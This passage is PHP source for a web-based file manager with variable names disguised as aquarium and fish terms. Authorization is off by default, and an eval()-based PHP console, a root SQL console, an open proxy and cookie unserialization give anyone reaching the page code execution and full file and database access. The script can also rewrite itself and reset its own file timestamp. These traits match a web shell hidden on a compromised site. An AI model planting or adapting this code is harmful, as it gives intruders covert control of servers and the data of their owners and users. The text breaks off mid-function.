<?php




/* Shinoruno Sukechu PHP File manager */







// Configuration when do not change manually!
$bruceToken = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';






$aquariumTemplates = '{"Settings":"global $reefConfig;\r\nvar_export($reefConfig);","Backup SQL tables":"echo backupFishTables();"}';

$fishSqlTemplates = '{"All bases":"SHOW DATABASES;","All tables":"SHOW TABLES;"}';






$tankTranslation = '{"id":"en","Add":"Add","Are you sure you want to delete this directory (recursively)?":"Are you sure you want to delete this directory (recursively)?","Are you sure you want to delete this file?":"Are you sure you want to delete this file?","Archiving":"Archiving","Authorization":"Authorization","Back":"Back","Cancel":"Cancel","Chinese":"Chinese","Compress":"Compress","Console":"Console","Cookie":"Cookie","Created":"Created","Date":"Date","Days":"Days","Decompress":"Decompress","Delete":"Delete","Deleted":"Deleted","Download":"Download","done":"done","Edit":"Edit","Enter":"Enter","English":"English","Error occurred":"Error occurred","File manager":"File manager","File selected":"File selected","File updated":"File updated","Filename":"Filename","Files uploaded":"Files uploaded","French":"French","Generation time":"Generation time","German":"German","Home":"Home","Quit":"Quit","Language":"Language","Login":"Login","Manage":"Manage","Make directory":"Make directory","Name":"Name","New":"New","New file":"New file","no files":"no files","Password":"Password","pictures":"pictures","Recursively":"Recursively","Rename":"Rename","Reset":"Reset","Reset settings":"Reset settings","Restore file time after editing":"Restore file time after editing","Result":"Result","Rights":"Rights","Russian":"Russian","Save":"Save","Select":"Select","Select the file":"Select the file","Settings":"Settings","Show":"Show","Show size of the folder":"Show size of the folder","Size":"Size","Spanish":"Spanish","Submit":"Submit","Task":"Task","templates":"templates","Ukrainian":"Ukrainian","Upload":"Upload","Value":"Value","Hello":"Hello"}';




// end configuration

// Preparations

$startSwimTime = explode(' ', microtime());

$startSwimTime = $startSwimTime[1] + $startSwimTime[0];
$gillLanguages = array('en','ru','de','fr','uk');


$nemoPath = empty($_REQUEST['path']) ? $nemoPath = realpath('.') : realpath($_REQUEST['path']);
$nemoPath = str_replace('\\', '/', $nemoPath) . '/';



$mainAquariumPath=str_replace('\\', '/',realpath('./'));


$maybeDebPhar = (version_compare(phpversion(),"5.3.0","<"))?true:false;






$marlinMessage = ''; // everyone want be succes



$reefDefaultLanguage = 'ru';
$detectFishLanguage = true;

$nemoVersion = 1.4;






//Authorization



$doryAuthenticated = json_decode($bruceToken,true);





$doryAuthenticated['authorize'] = isset($doryAuthenticated['authorize']) ? $doryAuthenticated['authorize'] : 0; 




$doryAuthenticated['days_authorization'] = (isset($doryAuthenticated['days_authorization'])&&is_numeric($doryAuthenticated['days_authorization'])) ? (int)$doryAuthenticated['days_authorization'] : 30;




$doryAuthenticated['login'] = isset($doryAuthenticated['login']) ? $doryAuthenticated['login'] : 'admin';  
$doryAuthenticated['password'] = isset($doryAuthenticated['password']) ? $doryAuthenticated['password'] : 'phpfm';  
$doryAuthenticated['cookie_name'] = isset($doryAuthenticated['cookie_name']) ? $doryAuthenticated['cookie_name'] : 'fm_user';

$doryAuthenticated['script'] = isset($doryAuthenticated['script']) ? $doryAuthenticated['script'] : '';


// Little default config



$defaultReefConfig = array (






	'make_directory' => true, 
	'new_file' => true, 
	'upload_file' => true, 



	'show_dir_size' => false, //if true, show directory size â†’ maybe slow 



	'show_img' => true, 
	'show_php_ver' => true, 

	'show_php_ini' => false, // show path to current php.ini




	'show_gt' => true, // show generation time
	'enable_php_console' => true,



	'enable_sql_console' => true,
	'sql_server' => 'localhost',




	'sql_username' => 'root',
	'sql_password' => '',
	'sql_db' => 'test_base',
	'enable_proxy' => true,
	'show_phpinfo' => true,




	'show_xls' => true,


	'fm_settings' => true,

	'restore_time' => true,



	'fm_restore_time' => false,
);



if (empty($_COOKIE['fm_config'])) $reefConfig = $defaultReefConfig;






else $reefConfig = unserialize($_COOKIE['fm_config']);






// Change language
if (isset($_POST['fm_lang'])) { 



	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $doryAuthenticated['days_authorization']));


	$_COOKIE['fm_lang'] = $_POST['fm_lang'];





}





$aquariumLanguage = $reefDefaultLanguage;




// Detect browser language






if($detectFishLanguage && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){
	$reefLanguagePriority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);

	if (!empty($reefLanguagePriority)){
		foreach ($reefLanguagePriority as $fishLanguages){



			$reefLng = explode(';', $fishLanguages);



			$reefLng = $reefLng[0];


			if(in_array($reefLng,$gillLanguages)){






				$aquariumLanguage = $reefLng;




				break;
			}



		}



	}


} 






// Cookie language is primary for ever





$aquariumLanguage = (empty($_COOKIE['fm_lang'])) ? $aquariumLanguage : $_COOKIE['fm_lang'];




// Localization





$fishLanguage = json_decode($tankTranslation,true);



if ($fishLanguage['id']!=$aquariumLanguage) {



	$getFishLanguage = file_get_contents('https://raw.githubusercontent.com/Den1xxx/Filemanager/master/languages/' . $aquariumLanguage . '.json');




	if (!empty($getFishLanguage)) {
		//remove unnecessary characters


		$bubbleTranslationString = str_replace("'",'&#39;',json_encode(json_decode($getFishLanguage),JSON_UNESCAPED_UNICODE));



		$nemoFileContent = file_get_contents(__FILE__);


		$searchBubble = preg_match('#translation[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $nemoFileContent, $bubbleMatches);
		if (!empty($bubbleMatches[1])) {
			$reefFileModified = filemtime(__FILE__);
			$replaceMarlin = str_replace('{"'.$bubbleMatches[1].'"}',$bubbleTranslationString,$nemoFileContent);






			if (file_put_contents(__FILE__, $replaceMarlin)) {

				$marlinMessage .= __('File updated');
			}	else $marlinMessage .= __('Error occurred');
			if (!empty($reefConfig['fm_restore_time'])) touch(__FILE__,$reefFileModified);



		}	



		$fishLanguage = json_decode($bubbleTranslationString,true);
	}






}








/* Functions */

//translation





function __($nemoText){






	global $fishLanguage;





	if (isset($fishLanguage[$nemoText])) return $fishLanguage[$nemoText];
	else return $nemoText;


};



//delete files and dirs recursively


function deleteSharkFiles($marlinFile, $fishIsRecursive = false) {
	if($fishIsRecursive && @is_dir($marlinFile)) {


		$bloatElementList = scanTankDirectory($marlinFile, '', '', true);

		foreach ($bloatElementList as $elementAquarium) {


			if($elementAquarium != '.' && $elementAquarium != '..'){



				deleteSharkFiles($marlinFile . '/' . $elementAquarium, true);





			}
		}

	}



	if(@is_dir($marlinFile)) {





		return rmdir($marlinFile);
	} else {






		return @unlink($marlinFile);




	}

}



//file perms



function permissionsTankString($marlinFile, $ifNemo = false){



	$tankPermissions = fileperms($marlinFile);



	$nemoInfo = '';



	if(!$ifNemo){
		if (($tankPermissions & 0xC000) == 0xC000) {





			//Socket



			$nemoInfo = 's';





		} elseif (($tankPermissions & 0xA000) == 0xA000) {





			//Symbolic Link





			$nemoInfo = 'l';




		} elseif (($tankPermissions & 0x8000) == 0x8000) {
			//Regular
			$nemoInfo = '-';


		} elseif (($tankPermissions & 0x6000) == 0x6000) {


			//Block special



			$nemoInfo = 'b';

		} elseif (($tankPermissions & 0x4000) == 0x4000) {






			//Directory



			$nemoInfo = 'd';


		} elseif (($tankPermissions & 0x2000) == 0x2000) {



			//Character special
			$nemoInfo = 'c';




		} elseif (($tankPermissions & 0x1000) == 0x1000) {





			//FIFO pipe



			$nemoInfo = 'p';





		} else {
			//Unknown





			$nemoInfo = 'u';




		}
	}
  
	//Owner


	$nemoInfo .= (($tankPermissions & 0x0100) ? 'r' : '-');
	$nemoInfo .= (($tankPermissions & 0x0080) ? 'w' : '-');






	$nemoInfo .= (($tankPermissions & 0x0040) ?
	(($tankPermissions & 0x0800) ? 's' : 'x' ) :



	(($tankPermissions & 0x0800) ? 'S' : '-'));
 
	//Group



	$nemoInfo .= (($tankPermissions & 0x0020) ? 'r' : '-');
	$nemoInfo .= (($tankPermissions & 0x0010) ? 'w' : '-');


	$nemoInfo .= (($tankPermissions & 0x0008) ?
	(($tankPermissions & 0x0400) ? 's' : 'x' ) :





	(($tankPermissions & 0x0400) ? 'S' : '-'));




 



	//World


	$nemoInfo .= (($tankPermissions & 0x0004) ? 'r' : '-');


	$nemoInfo .= (($tankPermissions & 0x0002) ? 'w' : '-');


	$nemoInfo .= (($tankPermissions & 0x0001) ?






	(($tankPermissions & 0x0200) ? 't' : 'x' ) :





	(($tankPermissions & 0x0200) ? 'T' : '-'));




	return $nemoInfo;

}











function convertTankPermissions($swimMode) {

	$swimMode = str_pad($swimMode,9,'-');


	$nemoTranslation = array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');





	$swimMode = strtr($swimMode,$nemoTranslation);
	$newGillMode = '0';






	$tankOwner = (int) $swimMode[0] + (int) $swimMode[1] + (int) $swimMode[2]; 
	$tankGroup = (int) $swimMode[3] + (int) $swimMode[4] + (int) $swimMode[5]; 



	$oceanGlobal = (int) $swimMode[6] + (int) $swimMode[7] + (int) $swimMode[8]; 
	$newGillMode .= $tankOwner . $tankGroup . $oceanGlobal;
	return intval($newGillMode, 8);
}










function nemoChangePermissions($marlinFile, $marlinValue, $nemoRecord = false) {




	$nemoResult = @chmod(realpath($marlinFile), $marlinValue);

	if(@is_dir($marlinFile) && $nemoRecord){
		$bloatElementList = scanTankDirectory($marlinFile);


		foreach ($bloatElementList as $elementAquarium) {
			$nemoResult = $nemoResult && nemoChangePermissions($marlinFile . '/' . $elementAquarium, $marlinValue, true);



		}





	}
	return $nemoResult;
}









//load files
function downloadNemoFile($nemoFileName) {
    if (!empty($nemoFileName)) {
		if (file_exists($nemoFileName)) {
			header("Content-Disposition: attachment; filename=" . basename($nemoFileName));   






			header("Content-Type: application/force-download");



			header("Content-Type: application/octet-stream");
			header("Content-Type: application/download");



			header("Content-Description: File Transfer");            




			header("Content-Length: " . filesize($nemoFileName));		





			flush(); // this doesn't really matter.




			$reefPointer = fopen($nemoFileName, "r");
			while (!feof($reefPointer)) {
				echo fread($reefPointer, 65536);






				flush(); // this is essential for large downloads




			} 
			fclose($reefPointer);






			die();
		} else {
			header('HTTP/1.0 404 Not Found', true, 404);
			header('Status: 404 Not Found'); 


			die();






        }






    } 





}





//show folder size
function calculateTankDirectorySize($gillFile,$fishFormat=true) {




	if($fishFormat)  {


		$schoolSize=calculateTankDirectorySize($gillFile,false);





		if($schoolSize<=1024) return $schoolSize.' bytes';



		elseif($schoolSize<=1024*1024) return round($schoolSize/(1024),2).'&nbsp;Kb';
		elseif($schoolSize<=1024*1024*1024) return round($schoolSize/(1024*1024),2).'&nbsp;Mb';




		elseif($schoolSize<=1024*1024*1024*1024) return round($schoolSize/(1024*1024*1024),2).'&nbsp;Gb';
		elseif($schoolSize<=1024*1024*1024*1024*1024) return round($schoolSize/(1024*1024*1024*1024),2).'&nbsp;Tb'; //:)))
		else return round($schoolSize/(1024*1024*1024*1024*1024),2).'&nbsp;Pb'; // ;-)
	} else {



		if(is_file($gillFile)) return filesize($gillFile);
		$schoolSize=0;




		$gurgleDirHandle=opendir($gillFile);




		while(($marlinFile=readdir($gurgleDirHandle))!==false) {




			if($marlinFile=='.' || $marlinFile=='..') continue;


			if(is_file($gillFile.'/'.$marlinFile)) $schoolSize+=filesize($gillFile.'/'.$marlinFile);
			else $schoolSize+=calculateTankDirectorySize($gillFile.'/'.$marlinFile,false);



		}

		closedir($gurgleDirHandle);


		return $schoolSize+filesize($gillFile); 
	}
}





//scan directory




function scanTankDirectory($reefDirectoryPath, $explosiveBubble = '', $fishType = 'all', $noSharkFilter = false) {

	$aquariumDirectory = $numFishDirs = array();
	if(!empty($explosiveBubble)){






		$explosiveBubble = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $explosiveBubble)) . '$/';



	}
	if(!empty($fishType) && $fishType !== 'all'){
		$reefFunction = 'is_' . $fishType;




	}




	if(@is_dir($reefDirectoryPath)){





		$gillFileHandle = opendir($reefDirectoryPath);






		while (false !== ($doryFilename = readdir($gillFileHandle))) {


			if(substr($doryFilename, 0, 1) != '.' || $noSharkFilter) {





				if((empty($fishType) || $fishType == 'all' || $reefFunction($reefDirectoryPath . '/' . $doryFilename)) && (empty($explosiveBubble) || preg_match($explosiveBubble, $doryFilename))){

					$aquariumDirectory[] = $doryFilename;



				}



			}





		}






		closedir($gillFileHandle);



		natsort($aquariumDirectory);




	}


	return $aquariumDirectory;




}




function nemoMainLink($getNemo,$nemoLink,$nemoName,$reefTitle='') {




	if (empty($reefTitle)) $reefTitle=$nemoName.' '.basename($nemoLink);




	return '&nbsp;&nbsp;<a href="?'.$getNemo.'='.base64_encode($nemoLink).'" title="'.$reefTitle.'">'.$nemoName.'</a>';



}













function fishArrayToOptions($fishArray,$peachN,$selectedFin=''){

	foreach($fishArray as $nemoV){
		$bubblesByte=$nemoV[$peachN];

		$nemoResult.='<option value="'.$bubblesByte.'" '.($selectedFin && $selectedFin==$bubblesByte?'selected':'').'>'.$bubblesByte.'</option>';
	}


	return $nemoResult;





}










function aquariumLanguageForm ($currentFin='en'){
return '



<form name="change_lang" method="post" action="">
	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >




		<option value="en" '.($currentFin=='en'?'selected="selected" ':'').'>'.__('English').'</option>
		<option value="de" '.($currentFin=='de'?'selected="selected" ':'').'>'.__('German').'</option>


		<option value="ru" '.($currentFin=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>


		<option value="fr" '.($currentFin=='fr'?'selected="selected" ':'').'>'.__('French').'</option>



		<option value="uk" '.($currentFin=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>
	</select>



</form>






';






}



	





function reefRootDirectory($doryDirectoryName){





	return ($doryDirectoryName=='.' OR $doryDirectoryName=='..');

}

function aquariumPanel($nemoString){


	$showNemoWarnings=ini_get('display_errors');


	ini_set('display_errors', '1');
	ob_start();



	eval(trim($nemoString));



	$nemoText = ob_get_contents();



	ob_end_clean();






	ini_set('display_errors', $showNemoWarnings);


	return $nemoText;
}






//SHOW DATABASES




function connectToTankSql(){

	global $reefConfig;

	return new mysqli($reefConfig['sql_server'], $reefConfig['sql_username'], $reefConfig['sql_password'], $reefConfig['sql_db']);



}






function executeDorySql($fishQuery){



	global $reefConfig;


	$fishQuery=trim($fishQuery);




	ob_start();


	$seagullConnection = connectToTankSql();



	if ($seagullConnection->connect_error) {



		ob_end_clean();	

		return $seagullConnection->connect_error;
	}
	$seagullConnection->set_charset('utf8');

    $queriedBubbles = mysqli_query($seagullConnection,$fishQuery);
	if ($queriedBubbles===false) {
		ob_end_clean();	



		return mysqli_error($seagullConnection);
    } else {


		if(!empty($queriedBubbles)){




			while($marlinRow = mysqli_fetch_assoc($queriedBubbles)) {
				$tankQueryResult[]=  $marlinRow;






			}






		}
		$nemoDump=empty($tankQueryResult)?'':var_export($tankQueryResult,true);	
		ob_end_clean();	


		$seagullConnection->close();






		return '<pre>'.stripslashes($nemoDump).'</pre>';
	}



}









function backupFishTables($fishTables = '*', $fullTankBackup = true) {





	global $nemoPath;




	$sharkDatabase = connectToTankSql();




	$oceanDelimiter = "; \n  \n";

	if($fishTables == '*')	{


		$fishTables = array();




		$tankResult = $sharkDatabase->query('SHOW TABLES');





		while($marlinRow = mysqli_fetch_row($tankResult))	{
			$fishTables[] = $marlinRow[0];

		}





	} else {




		$fishTables = is_array($fishTables) ? $fishTables : explode(',',$fishTables);
	}






    





	$returnToReef='';





	foreach($fishTables as $tankTable)	{





		$tankResult = $sharkDatabase->query('SELECT * FROM '.$tankTable);

		$reefFieldCount = mysqli_num_fields($tankResult);

		$returnToReef.= 'DROP TABLE IF EXISTS `'.$tankTable.'`'.$oceanDelimiter;

		$doryRowAlt = mysqli_fetch_row($sharkDatabase->query('SHOW CREATE TABLE '.$tankTable));
		$returnToReef.=$doryRowAlt[1].$oceanDelimiter;

        if ($fullTankBackup) {






		for ($peachI = 0; $peachI < $reefFieldCount; $peachI++)  {





			while($marlinRow = mysqli_fetch_row($tankResult)) {




				$returnToReef.= 'INSERT INTO `'.$tankTable.'` VALUES(';






				for($jacquesJ=0; $jacquesJ<$reefFieldCount; $jacquesJ++)	{






					$marlinRow[$jacquesJ] = addslashes($marlinRow[$jacquesJ]);




					$marlinRow[$jacquesJ] = str_replace("\n","\\n",$marlinRow[$jacquesJ]);

					if (isset($marlinRow[$jacquesJ])) { $returnToReef.= '"'.$marlinRow[$jacquesJ].'"' ; } else { $returnToReef.= '""'; }




					if ($jacquesJ<($reefFieldCount-1)) { $returnToReef.= ','; }



				}
				$returnToReef.= ')'.$oceanDelimiter;





			}
		  }

		} else { 
		$returnToReef = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $returnToReef);





		}
		$returnToReef.="\n\n\n";


	}

	//save file

    $marlinFile=gmdate("Y-m-d_H-i-s",time()).'.sql';





	$gillHandle = fopen($marlinFile,'w+');






	fwrite($gillHandle,$returnToReef);
	fclose($gillHandle);


	$sharkAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $marlinFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'?delete=' . $marlinFile . '&path=' . $nemoPath  . '\'"';






    return $marlinFile.': '.nemoMainLink('download',$nemoPath.$marlinFile,__('Download'),__('Download').' '.$marlinFile).' <a href="#" title="' . __('Delete') . ' '. $marlinFile . '" ' . $sharkAlert . '>' . __('Delete') . '</a>';


}












function restoreFishTables($sqlToSwim) {

	$sharkDatabase = connectToTankSql();




	$oceanDelimiter = "; \n  \n";






    // Load and explode the sql file
    $gillFile = fopen($sqlToSwim,"r+");
    $sqlNemoFile = fread($gillFile,filesize($sqlToSwim));



    $sqlDoryArray = explode($oceanDelimiter,$sqlNemoFile);




	





    //Process the sql file by statements
    foreach ($sqlDoryArray as $nemoStatement) {
        if (strlen($nemoStatement)>3){
			$tankResult = $sharkDatabase->query($nemoStatement);






				if (!$tankResult){
					$sqlFishErrorCode = mysqli_errno($sharkDatabase->connection);






					$sqlFishErrorText = mysqli_error($sharkDatabase->connection);
					$nemoSqlStatement      = $nemoStatement;




					break;
           	     }



           	  }
           }
if (empty($sqlFishErrorCode)) return __('Success').' â€” '.$sqlToSwim;





else return $sqlFishErrorText.'<br/>'.$nemoStatement;
}



function reefImageUrl($doryFilename){
	return './'.basename(__FILE__).'?img='.base64_encode($doryFilename);



}






function nemoHomeStyle(){






	return '




input, input.fm_input {

	text-indent: 2px;



}




input, textarea, select, input.fm_input {

	color: black;
	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;
	border-color: black;
	background-color: #FCFCFC none !important;
	border-radius: 0;






	padding: 2px;






}



input.fm_input {




	background: #FCFCFC none !important;

	cursor: pointer;



}





.home {
	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");



	background-repeat: no-repeat;

}';
}





function reefConfigCheckboxRow($nemoName,$nemoValue) {




	global $reefConfig;
	return '<tr><td class="row1"><input id="fm_config_'.$nemoValue.'" name="fm_config['.$nemoValue.']" value="1" '.(empty($reefConfig[$nemoValue])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$nemoValue.'">'.$nemoName.'</td></tr>';

}








function reefProtocol() {
	if (isset($_SERVER['HTTP_SCHEME'])) return $_SERVER['HTTP_SCHEME'].'://';


	if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') return 'https://';
	if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) return 'https://';
	if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') return 'https://';



	return 'http://';
}


function reefSiteUrl() {





	return reefProtocol().$_SERVER['HTTP_HOST'];


}

function getTankUrl($fullOcean=false) {



	$sydneyHost=$fullOcean?reefSiteUrl():'.';
	return $sydneyHost.'/'.basename(__FILE__);
}


function reefHome($fullOcean=false){
	return '&nbsp;<a href="'.getTankUrl($fullOcean).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';






}







function runFishInput($reefLng) {
	global $reefConfig;
	$returnToReef = !empty($reefConfig['enable_'.$reefLng.'_console']) ? 






	'

				<form  method="post" action="'.getTankUrl().'" style="display:inline">





				<input type="submit" name="'.$reefLng.'run" value="'.strtoupper($reefLng).' '.__('Console').'">


				</form>
' : '';





	return $returnToReef;
}











function tankUrlProxy($bubbleMatches) {



	$nemoLink = str_replace('&amp;','&',$bubbleMatches[2]);



	$tankUrl = isset($_GET['url'])?$_GET['url']:'';


	$parseNemoUrl = parse_url($tankUrl);





	$sydneyHost = $parseNemoUrl['scheme'].'://'.$parseNemoUrl['host'].'/';



	if (substr($nemoLink,0,2)=='//') {

		$nemoLink = substr_replace($nemoLink,reefProtocol(),0,2);

	} elseif (substr($nemoLink,0,1)=='/') {




		$nemoLink = substr_replace($nemoLink,$sydneyHost,0,1);	
	} elseif (substr($nemoLink,0,2)=='./') {
		$nemoLink = substr_replace($nemoLink,$sydneyHost,0,2);	





	} elseif (substr($nemoLink,0,4)=='http') {



		//alles machen wunderschon





	} else {






		$nemoLink = $sydneyHost.$nemoLink;


	} 

	if ($bubbleMatches[1]=='href' && !strripos($nemoLink, 'css')) {
		$reefBasePath = reefSiteUrl().'/'.basename(__FILE__);






		$nemoQuery = $reefBasePath.'?proxy=true&url=';




		$nemoLink = $nemoQuery.urlencode($nemoLink);






	} elseif (strripos($nemoLink, 'css')){
		//ĞºĞ°Ğº-Ñ‚Ğ¾ Ñ‚Ğ¾Ğ¶Ğµ Ğ¿Ğ¾Ğ´Ğ¼ĞµĞ½ÑÑ‚ÑŒ Ğ½Ğ°Ğ´Ğ¾
	}

	return $bubbleMatches[1].'="'.$nemoLink.'"';


}






 


function tankTemplateForm($fishLanguageTemplate) {



	global ${$fishLanguageTemplate.'_templates'};



	$tankTemplateArray = json_decode(${$fishLanguageTemplate.'_templates'},true);

	$bubbleString = '';






	foreach ($tankTemplateArray as $keyTemplateReef=>$tankViewTemplate) {





		$bubbleString .= '<tr><td class="row1"><input name="'.$fishLanguageTemplate.'_name[]" value="'.$keyTemplateReef.'"></td><td class="row2 whole"><textarea name="'.$fishLanguageTemplate.'_value[]"  cols="55" rows="5" class="textarea_input">'.$tankViewTemplate.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';




	}

return '
<table>

<tr><th colspan="2">'.strtoupper($fishLanguageTemplate).' '.__('templates').' '.runFishInput($fishLanguageTemplate).'</th></tr>
<form method="post" action="">




<input type="hidden" value="'.$fishLanguageTemplate.'" name="tpl_edited">





<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>



'.$bubbleString.'


<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.getTankUrl().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>
</form>



<form method="post" action="">






<input type="hidden" value="'.$fishLanguageTemplate.'" name="tpl_edited">


<tr><td class="row1"><input name="'.$fishLanguageTemplate.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$fishLanguageTemplate.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>



</form>



</table>



';
}









/* End Functions */







// authorization
if ($doryAuthenticated['authorize']) {





	if (isset($_POST['login']) && isset($_POST['password'])){





		if (($_POST['login']==$doryAuthenticated['login']) && ($_POST['password']==$doryAuthenticated['password'])) {


			setcookie($doryAuthenticated['cookie_name'], $doryAuthenticated['login'].'|'.md5($doryAuthenticated['password']), time() + (86400 * $doryAuthenticated['days_authorization']));
			$_COOKIE[$doryAuthenticated['cookie_name']]=$doryAuthenticated['login'].'|'.md5($doryAuthenticated['password']);
		}

	}






	if (!isset($_COOKIE[$doryAuthenticated['cookie_name']]) OR ($_COOKIE[$doryAuthenticated['cookie_name']]!=$doryAuthenticated['login'].'|'.md5($doryAuthenticated['password']))) {



		echo '



<!doctype html>

<html>
<head>

<meta charset="utf-8" />




<meta name="viewport" content="width=device-width, initial-scale=1" />






<title>'.__('File manager').'</title>






</head>


<body>
<form action="" method="post">


'.__('Login').' <input name="login" type="text">&nbsp;&nbsp;&nbsp;
'.__('Password').' <input name="password" type="password">&nbsp;&nbsp;&nbsp;
<input type="submit" value="'.__('Enter').'" class="fm_input">




</form>



'.aquariumLanguageForm($aquariumLanguage).'
</body>



</html>

';  


die();



	}
	if (isset($_POST['quit'])) {



		unset($_COOKIE[$doryAuthenticated['cookie_name']]);




		setcookie($doryAuthenticated['cookie_name'], '', time() - (86400 * $doryAuthenticated['days_authorization']));
		header('Location: '.reefSiteUrl().$_SERVER['REQUEST_URI']);





	}



}



// Change config




if (isset($_GET['fm_settings'])) {






	if (isset($_GET['fm_config_delete'])) { 



		unset($_COOKIE['fm_config']);


		setcookie('fm_config', '', time() - (86400 * $doryAuthenticated['days_authorization']));
		header('Location: '.getTankUrl().'?fm_settings=true');
		exit(0);




	}	elseif (isset($_POST['fm_config'])) { 



		$reefConfig = $_POST['fm_config'];






		setcookie('fm_config', serialize($reefConfig), time() + (86400 * $doryAuthenticated['days_authorization']));






		$_COOKIE['fm_config'] = serialize($reefConfig);
		$marlinMessage = __('Settings').' '.__('done');




	}	elseif (isset($_POST['fm_login'])) { 



		if (empty($_POST['fm_login']['authorize'])) $_POST['fm_login'] = array('authorize' => '0') + $_POST['fm_login'];



		$loginToTankForm = json_encode($_POST['fm_login']);





		$nemoFileContent = file_get_contents(__FILE__);


		$searchBubble = preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $nemoFileContent, $bubbleMatches);
		if (!empty($bubbleMatches[1])) {






			$reefFileModified = filemtime(__FILE__);



			$replaceMarlin = str_replace('{"'.$bubbleMatches[1].'"}',$loginToTankForm,$nemoFileContent);



			if (file_put_contents(__FILE__, $replaceMarlin)) {



				$marlinMessage .= __('File updated');
				if ($_POST['fm_login']['login'] != $doryAuthenticated['login']) $marlinMessage .= ' '.__('Login').': '.$_POST['fm_login']['login'];

				if ($_POST['fm_login']['password'] != $doryAuthenticated['password']) $marlinMessage .= ' '.__('Password').': '.$_POST['fm_login']['password'];
				$doryAuthenticated = $_POST['fm_login'];




			}
			else $marlinMessage .= __('Error occurred');






			if (!empty($reefConfig['fm_restore_time'])) touch(__FILE__,$reefFileModified);



		}


	} elseif (isset($_POST['tpl_edited'])) { 


		$fishLanguageTemplate = $_POST['tpl_edited'];
		if (!empty($_POST[$fishLanguageTemplate.'_name'])) {
			$aquariumPanel = json_encode(array_combine($_POST[$fishLanguageTemplate.'_name'],$_POST[$fishLanguageTemplate.'_value']),JSON_HEX_APOS);

